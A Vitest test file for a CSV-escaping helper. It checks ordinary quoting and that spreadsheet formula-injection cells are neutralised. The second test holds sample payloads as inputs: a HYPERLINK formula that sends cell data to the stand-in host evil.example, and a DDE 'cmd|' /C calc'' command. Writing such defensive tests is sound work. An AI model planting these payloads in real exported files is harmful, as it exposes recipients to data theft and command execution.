import { describe, expect, it } from 'vitest';
import { csvField } from '@/app/_lib/csv';

describe('csvField', () => {
  it('quotes separators, quotes, tabs and line breaks; other values stay as they are', () => {
    expect(csvField('BA: Byt; 1')).toBe('"BA: Byt; 1"');
    expect(csvField('say "hi"')).toBe('"say ""hi"""');
    expect(csvField('a\nb')).toBe('"a\nb"');
    expect(csvField('a\tb')).toBe('"a\tb"');
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
    expect(csvField(3)).toBe('3');
    expect(csvField({ note: 'x' })).toBe('"{""note"":""x""}"');
    expect(csvField('2026-10-01T06:30:00.000Z')).toBe('2026-10-01T06:30:00.000Z');
    expect(csvField('Zabalil(a) —')).toBe('Zabalil(a) —');
  });

  it('neutralises cells a spreadsheet would evaluate as formulas', () => {
    expect(csvField('=HYPERLINK("http://evil.example/"&A1;"Otvoriť")')).toBe(`"'=HYPERLINK(""http://evil.example/""&A1;""Otvoriť"")"`);
    expect(csvField("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
    expect(csvField('@sum')).toBe("'@sum");
    expect(csvField('+1')).toBe("'+1");
    expect(csvField('  =1')).toBe("'  =1");
    expect(csvField('\t=1')).toBe(`"'\t=1"`);
    expect(csvField('\r=1')).toBe(`"'\r=1"`);
  });
});
